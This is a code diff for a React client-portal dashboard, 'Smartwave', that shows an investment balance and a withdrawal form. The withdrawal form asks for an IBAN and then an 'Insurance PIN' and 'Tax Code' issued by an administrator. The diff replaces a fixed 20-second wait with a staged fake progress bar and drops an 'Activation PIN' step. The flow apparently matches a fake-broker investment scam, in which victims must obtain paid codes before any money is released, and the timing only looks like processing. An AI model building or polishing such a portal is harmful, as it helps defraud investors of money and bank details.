@@ -22,18 +22,17 @@ const banks = [
   'Bank Millennium',
 ]
 const money = (value: number, currency = 'PLN') => new Intl.NumberFormat('pl-PL', { style: 'currency', currency }).format(value)
-const stages = ['details', 'insurance', 'tax', 'activation'] as const
+const stages = ['details', 'insurance', 'tax'] as const
 type Stage = typeof stages[number] | 'complete'
 type Account = { id: string; account_number: string; currency: string; total_value: number; available_balance: number }
 type Profile = { full_name: string; address_line_1?: string; city?: string }
 type Withdrawal = { id: string; amount: number; currency: string; status: string; created_at: string }
 
 const stageCopy: Record<Stage, { title: string; eyebrow: string; action: string; hint: string }> = {
-  details: { eyebrow: 'STEP 1 OF 4', title: 'Request a withdrawal.', action: 'Send', hint: 'Enter the destination details for this transfer.' },
-  insurance: { eyebrow: 'STEP 2 OF 4', title: 'Confirm your Insurance PIN.', action: 'Verify Insurance PIN →', hint: 'Enter the Insurance PIN issued by your Smartwave administrator.' },
-  tax: { eyebrow: 'STEP 3 OF 4', title: 'Confirm your Tax Code.', action: 'Verify Tax Code →', hint: 'Enter the Tax Code issued by your Smartwave administrator.' },
-  activation: { eyebrow: 'STEP 4 OF 4', title: 'Confirm your Activation PIN.', action: 'Submit withdrawal →', hint: 'Enter your Activation PIN to submit this withdrawal for review.' },
-  complete: { eyebrow: 'REQUEST SUBMITTED', title: 'Your withdrawal is in review.', action: 'Close', hint: 'Your request has been recorded and will be reviewed by Smartwave Finance.' },
+  details: { eyebrow: '', title: 'Request a withdrawal.', action: 'Send', hint: 'Enter the destination details for this transfer.' },
+  insurance: { eyebrow: '', title: 'Confirm your Insurance PIN.', action: 'Verify Insurance PIN →', hint: 'Enter the Insurance PIN issued by your Smartwave administrator.' },
+  tax: { eyebrow: '', title: 'Confirm your Tax Code.', action: 'Submit withdrawal →', hint: 'Enter the Tax Code issued by your Smartwave administrator.' },
+  complete: { eyebrow: '', title: 'Your withdrawal is pending.', action: 'Close', hint: 'Your request has been submitted for Smartwave Finance review.' },
 }
 
 export default function Dashboard({ onSignOut }: { onSignOut: () => void | Promise<void> }) {
@@ -50,6 +49,7 @@ export default function Dashboard({ onSignOut }: { onSignOut: () => void | Promi
   const [sessionId, setSessionId] = useState('')
   const [pin, setPin] = useState('')
   const [submitting, setSubmitting] = useState(false)
+  const [progress, setProgress] = useState(0)
 
   useEffect(() => {
     const url = process.env.NEXT_PUBLIC_SUPABASE_URL
@@ -77,11 +77,11 @@ export default function Dashboard({ onSignOut }: { onSignOut: () => void | Promi
   }, [submitting])
 
   const closeWithdrawal = () => {
-    setModal(false); setMessage(''); setStage('details'); setAmount(''); setIban(''); setPin(''); setSessionId('')
+    setModal(false); setMessage(''); setStage('details'); setAmount(''); setIban(''); setPin(''); setSessionId(''); setProgress(0)
   }
 
   const openWithdrawal = () => {
-    setMessage(''); setStage('details'); setPin(''); setSessionId(''); setModal(true)
+    setMessage(''); setStage('details'); setPin(''); setSessionId(''); setProgress(0); setModal(true)
   }
 
   async function withdraw() {
@@ -97,18 +97,25 @@ export default function Dashboard({ onSignOut }: { onSignOut: () => void | Promi
 
     setSubmitting(true); setMessage('')
     try {
-      if (stage === 'details') await new Promise<void>((resolve) => window.setTimeout(resolve, 20_000))
+      if (stage === 'details') {
+        setProgress(15)
+        await new Promise<void>((resolve) => window.setTimeout(resolve, 5_000))
+        setProgress(28)
+        await new Promise<void>((resolve) => window.setTimeout(resolve, 6_000))
+        setProgress(60)
+        await new Promise<void>((resolve) => window.setTimeout(resolve, 9_000))
+      }
       const result = stage === 'details'
         ? await withdrawalAction({ action: 'start', amount: Number(amount), bank, iban })
         : await withdrawalAction({ sessionId, stage, pin })
       if (result.error) { setMessage(result.error); return }
       if (stage === 'details' && result.id && result.stage) {
-        setSessionId(result.id); setStage(result.stage as Stage); setPin(''); return
+        setSessionId(result.id); setProgress(98); setStage(result.stage as Stage); setPin(''); return
       }
       if (result.stage === 'complete') {
         if (result.withdrawal) setWithdrawals((items) => [result.withdrawal!, ...items.filter((item) => item.id !== result.withdrawal!.id)].slice(0, 5))
         if (result.account) setAccount((current) => current ? { ...current, ...result.account } : current)
-        setStage('complete')
+        setProgress(100); setStage('complete')
         return
       }
       setStage(result.stage as Stage); setPin('')
@@ -119,13 +126,13 @@ export default function Dashboard({ onSignOut }: { onSignOut: () => void | Promi
   const name = profile?.full_name ?? 'Client'
   const first = name.split(' ')[0]
   const currency = account?.currency ?? 'PLN'
-  const showPinStep = stage === 'insurance' || stage === 'tax' || stage === 'activation'
+  const showPinStep = stage === 'insurance' || stage === 'tax'
   const fieldError = (field: 'amount' | 'iban' | 'pin') => (field === 'amount' && message.toLowerCase().includes('amount')) || (field === 'iban' && message.includes('IBAN')) || (field === 'pin' && !message.includes('IBAN') && !message.toLowerCase().includes('amount') && Boolean(message))
   const jumpTo = (selector: string) => document.querySelector(selector)?.scrollIntoView({ behavior: 'smooth', block: 'start' })
 
   return <main className="dashboard">
     <aside><div className="brand"><span>⌁</span> smartwave</div><div className="profile"><div className="avatar">{name.split(' ').map(x => x[0]).join('').slice(0, 2)}</div><div><b>{loading ? 'Loading account…' : name}</b><small>{account?.account_number ?? 'No account number'}</small></div></div><nav className="side-nav" aria-label="Client portal"><a className="active" href="#overview" onClick={event => { event.preventDefault(); jumpTo('.dash-content') }}>⌂ Overview</a><a href="#portfolio" onClick={event => { event.preventDefault(); jumpTo('.portfolio') }}>◫ Portfolio</a><a href="#activity" onClick={event => { event.preventDefault(); jumpTo('.activity') }}>↗ Activity</a></nav><button className="signout" onClick={() => void onSignOut()}>↪ Sign out</button></aside>
     <section className="dash-content"><header><div><p className="eyebrow">CLIENT PORTAL</p><h1>Welcome, {first}.</h1></div></header><section className="balance-card"><div><p>YOUR TOTAL BALANCE</p><h2>{loading ? 'Loading…' : money(Number(account?.total_value ?? 0), currency)}</h2><span className="gain">Available to withdraw <em>{money(Number(account?.available_balance ?? 0), currency)}</em></span></div><div className="chart"><p>SMARTWAVE ACCOUNT</p><b>{account?.account_number ?? 'No account found'}</b><span>{profile?.address_line_1 ? `${profile.address_line_1}${profile.city ? `, ${profile.city}` : ''}` : 'Your registered address will appear here.'}</span></div></section><div className="overview-grid"><section className="portfolio"><div className="section-heading"><div><p className="eyebrow">YOUR PORTFOLIO</p><h2>Investment allocation</h2></div></div><div className="empty-data"><p>Allocation data has not been configured for this account.</p><small>Your Smartwave adviser will publish investment holdings here.</small></div></section><section className="quick"><p className="eyebrow">QUICK ACTIONS</p><button disabled={!account} onClick={openWithdrawal}><span>↗</span><div><b>Withdraw funds</b><small>Transfer to your bank</small></div><strong>→</strong></button></section></div><section className="activity"><div className="section-heading"><div><p className="eyebrow">RECENT ACTIVITY</p><h2>Withdrawal requests</h2></div></div>{withdrawals.length ? withdrawals.map(item => <div className="transaction" key={item.id}><span className="round-icon">↗</span><div><b>Withdrawal request</b><small>{new Intl.DateTimeFormat('en-GB', { dateStyle: 'medium' }).format(new Date(item.created_at))} · {item.status.replace('_', ' ')}</small></div><em>{money(Number(item.amount), item.currency)}</em></div>) : <div className="empty-data"><p>No withdrawal requests yet.</p></div>}</section></section>
-    {modal && <div className="modal-backdrop"><div className="withdraw-modal" role="dialog" aria-modal="true" aria-labelledby="withdrawal-title"><button className="close" aria-label="Close withdrawal" onClick={closeWithdrawal}>×</button><p className="eyebrow">WITHDRAW FUNDS</p><h2 id="withdrawal-title">{current.title}</h2>{stage !== 'complete' && <div className="steps" aria-label={`Withdrawal ${current.eyebrow}`}><span className={stage === 'details' ? 'current' : ''}>Details</span><b/><span className={stage === 'insurance' ? 'current' : ''}>Insurance</span><b/><span className={stage === 'tax' ? 'current' : ''}>Tax Code</span><b/><span className={stage === 'activation' ? 'current' : ''}>Activation</span></div>}<div className="step-content">{stage === 'details' && <><p className="step-hint">{current.hint}</p><label>Amount ({currency})<div className={`amount-input ${fieldError('amount') ? 'field-error' : ''}`}><span>{currency}</span><input type="number" min="1" max={account?.available_balance ?? 0} value={amount} onChange={e => { setAmount(e.target.value); setMessage('') }} placeholder="0.00"/></div></label><label>Destination bank<select value={bank} onChange={e => setBank(e.target.value)}>{banks.map(name => <option key={name}>{name}</option>)}</select></label><label>Polish IBAN<input className={fieldError('iban') ? 'field-error' : ''} value={iban} onChange={e => { setIban(e.target.value.toUpperCase()); setMessage('') }} placeholder="PL00 0000 0000 0000 0000 0000 0000"/></label></>}{showPinStep && <><p className="step-hint">{current.hint}</p><label>{stage === 'insurance' ? 'Insurance PIN' : stage === 'tax' ? 'Tax Code' : 'Activation PIN'}<input className={`pin-input ${fieldError('pin') ? 'field-error' : ''}`} type="password" inputMode="numeric" autoComplete="one-time-code" maxLength={6} value={pin} onChange={e => { setPin(e.target.value.replace(/\D/g, '')); setMessage('') }} placeholder="••••••"/></label><p className="pin-security-note">For your security, each code is limited to three attempts.</p></>}{stage === 'complete' && <div className="success"><div className="success-mark">✓</div><p>{current.hint}</p></div>}{message && <p className="modal-validation-error" role="alert">{message}</p>}{stage === 'complete' ? <button className="primary" onClick={closeWithdrawal}>Close</button> : <button className="primary" disabled={submitting || (stage === 'details' ? !amount || !iban : pin.length !== 6)} onClick={() => void withdraw()}>{current.action}</button>}</div></div></div>}
+    {modal && <div className="modal-backdrop"><div className="withdraw-modal" role="dialog" aria-modal="true" aria-labelledby="withdrawal-title"><button className="close" aria-label="Close withdrawal" onClick={closeWithdrawal}>×</button><p className="eyebrow">WITHDRAW FUNDS</p><h2 id="withdrawal-title">{current.title}</h2>{progress > 0 && <div className="withdrawal-progress" aria-label={`Withdrawal progress: ${progress}%`}><div><span>Request progress</span><b>{progress}%</b></div><i><em style={{ width: `${progress}%` }}/></i></div>}<div className="step-content">{stage === 'details' && <><p className="step-hint">{current.hint}</p><label>Amount ({currency})<div className={`amount-input ${fieldError('amount') ? 'field-error' : ''}`}><span>{currency}</span><input type="number" min="1" max={account?.available_balance ?? 0} value={amount} onChange={e => { setAmount(e.target.value); setMessage('') }} placeholder="0.00"/></div></label><label>Destination bank<select value={bank} onChange={e => setBank(e.target.value)}>{banks.map(name => <option key={name}>{name}</option>)}</select></label><label>Polish IBAN<input className={fieldError('iban') ? 'field-error' : ''} value={iban} onChange={e => { setIban(e.target.value.toUpperCase()); setMessage('') }} placeholder="PL00 0000 0000 0000 0000 0000 0000"/></label></>}{showPinStep && <><p className="step-hint">{current.hint}</p><label>{stage === 'insurance' ? 'Insurance PIN' : 'Tax Code'}<input className={`pin-input ${fieldError('pin') ? 'field-error' : ''}`} type="password" inputMode="numeric" autoComplete="one-time-code" maxLength={6} value={pin} onChange={e => { setPin(e.target.value.replace(/\D/g, '')); setMessage('') }} placeholder="••••••"/></label><p className="pin-security-note">For your security, each code is limited to three attempts.</p></>}{stage === 'complete' && <div className="success"><div className="success-mark">✓</div><p>{current.hint}</p></div>}{message && <p className="modal-validation-error" role="alert">{message}</p>}{stage === 'complete' ? <button className="primary" onClick={closeWithdrawal}>Close</button> : <button className="primary" disabled={submitting || (stage === 'details' ? !amount || !iban : pin.length !== 6)} onClick={() => void withdraw()}>{current.action}</button>}</div></div></div>}
   </main>
 }
